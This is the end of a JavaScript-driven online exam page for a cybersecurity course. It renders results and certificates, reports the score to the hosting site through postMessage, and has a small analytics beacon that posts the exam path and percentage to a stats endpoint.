    var b = el('button', 'btn btn-ghost', 'Answer now');
    b.type = 'button';
    b.addEventListener('click', function () {
      S.reviewingFrom = id;
      S.pos = S.order.indexOf(id);
      renderExercise();
    });
    row.appendChild(b);
    sheet.appendChild(row);
  });
  var nav = el('div', 'navrow');
  var fin = el('button', 'btn btn-primary', '🏁 Finish the exam');
  fin.type = 'button';
  fin.addEventListener('click', function () { finishExam(null); });
  nav.appendChild(fin);
  sheet.appendChild(nav);
  stage.appendChild(sheet);
  renderHeader();
  window.scrollTo(0, 0);
}

/* ---------------- results ---------------- */
function renderResults(note) {
  var stage = $('#stage');
  stage.innerHTML = '';
  var full = 0, partial = 0, zero = 0, partialSum = 0, skippedNever = 0;
  DATA.exercises.forEach(function (e) {
    var r = S.rec[e.id];
    if (r.answered) {
      if (r.credit >= 1) { full++; }
      else if (r.credit > 0) { partial++; partialSum += r.credit; }
      else { zero++; }
    } else { skippedNever++; }
  });
  var percent = S.answered > 0 ? Math.round((S.creditSum / S.answered) * 100) : 0;
  var pass = percent >= 70 && S.answered > 0;
  var sheet = el('div', 'sheet');
  sheet.appendChild(el('h1', null, 'Final results — ' + esc(CFG.title)));
  sheet.appendChild(el('div', 'bigscore', percent + '%'));
  if (pass) {
    var pp = el('div', 'passpanel');
    pp.appendChild(el('div', null, '🎉 PASSED — certificate of completion'));
    pp.appendChild(el('div', 'certname', esc(S.user ? S.user : 'Cyber Pulse Academy learner')));
    pp.appendChild(el('div', 'small', esc(CFG.title) + ' · pass mark 70% · ' + new Date().toLocaleDateString()));
    sheet.appendChild(pp);
  } else {
    var fp = el('div', 'failpanel');
    fp.appendChild(el('div', null, '❌ Not passed this time'));
    fp.appendChild(el('div', 'small', 'You need at least 70% over the answered exercises. You must retake the exam.'));
    sheet.appendChild(fp);
  }
  if (note) { sheet.appendChild(el('div', 'notice', esc(note))); }
  var bd = el('div');
  function row(k, v) { var r = el('div', 'resrow'); r.appendChild(el('span', null, k)); r.appendChild(el('span', 'rv', v)); bd.appendChild(r); }
  row('Fully correct', String(full));
  row('Partially correct', partial ? partial + ' (avg ' + (partialSum / partial).toFixed(2) + ')' : '0');
  row('Fully incorrect', String(zero));
  row('Skipped and never answered (excluded)', String(skippedNever));
  row('Score over answered exercises', round1(S.creditSum) + ' / ' + S.answered + ' — ' + percent + '%');
  var active = Math.max(0, CFG.seconds - S.remaining);
  row('Active time on the clock', fmtClock(active));
  row('Time paused for manual breaks', fmtClock(S.pauseManualSec));
  row('Time spent studying feedback', fmtClock(S.pauseAutoSec));
  sheet.appendChild(el('h2', null, 'Score breakdown'));
  sheet.appendChild(bd);
  var nav = el('div', 'navrow');
  var rt = el('button', 'btn btn-primary', '🔁 Retake Exam');
  rt.type = 'button';
  rt.addEventListener('click', retake);
  nav.appendChild(rt);
  sheet.appendChild(nav);
  stage.appendChild(sheet);
  window.scrollTo(0, 0);
}

/* ---------------- website integration (STEP 6) ---------------- */
function reportScore() {
  if (S.reported) { return; }
  S.reported = true;
  var score = Math.round(S.creditSum);
  var total = S.answered;
  var percent = total > 0 ? Math.round((S.creditSum / total) * 100) : 0;
  try {
    parent.postMessage({
      type: 'CYBERPULSE_SCORE',
      topicId: META.topicId,
      batch: META.batch,
      score: score,
      total: total,
      percent: percent,
      passed: percent >= 70
    }, location.origin);
  } catch (e) {
    /* Opened directly rather than inside the site. Nothing to report to. */
  }
}
window.addEventListener('message', function (ev) {
  var d = ev.data;
  if (!d) { return; }
  if (d.type === 'CYBERPULSE_INIT' || d.type === 'CYBERMASTERY_INIT') {
    S.user = d.username || S.user;
    if (S.phase === 'intro' && S.user) { renderIntro(); }
  }
});

/* ---------------- boot ---------------- */
(function boot() {
  $('#btnHint').addEventListener('click', onHint);
  $('#btnSkip').addEventListener('click', onSkip);
  $('#btnPause').addEventListener('click', onPauseBtn);
  $('#btnResume').addEventListener('click', onPauseBtn);
  document.addEventListener('keydown', function (ev) {
    if (ev.key === 'Escape' && S.phase === 'exam' && S.timer === 'PAUSED_MANUAL') { onPauseBtn(); }
  });
  renderIntro();
})();
})();

</script>
<!-- cm-beacon: reports this attempt when the batch runs outside the hub -->
<script>
(function(){
  if (window.parent !== window) { return; }              /* inside the hub, exam-hub reports it */
  var m = /\/exercises\/(.+\.html)$/.exec(location.pathname);
  if (!m || !window.fetch) { return; }
  var path = 'exercises/' + m[1];
  var sent = false;
  window.addEventListener('message', function (e) {
    var d = e.data;
    if (typeof d === 'string') { try { d = JSON.parse(d); } catch (_) { return; } }
    if (!d || (d.type !== 'CYBERPULSE_SCORE' && d.type !== 'CYBERMASTERY_SCORE')) { return; }
    if (sent) { return; }
    var pct = (typeof d.percent === 'number') ? d.percent
      : ((typeof d.score === 'number' && typeof d.total === 'number' && d.total > 0)
          ? Math.round(d.score / d.total * 100) : null);
    if (pct === null) { return; }
    sent = true;
    fetch('https://cpa-engagement.marzouk-souhaieb.workers.dev/event', {
      method: 'POST', mode: 'cors', credentials: 'omit', keepalive: true,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        path: path, topicId: String(d.topicId || ''), percent: pct,
        passed: (typeof d.passed === 'boolean') ? d.passed : pct >= 70
      })
    })['catch'](function () { sent = false; });
  }, false);
})();
</script>
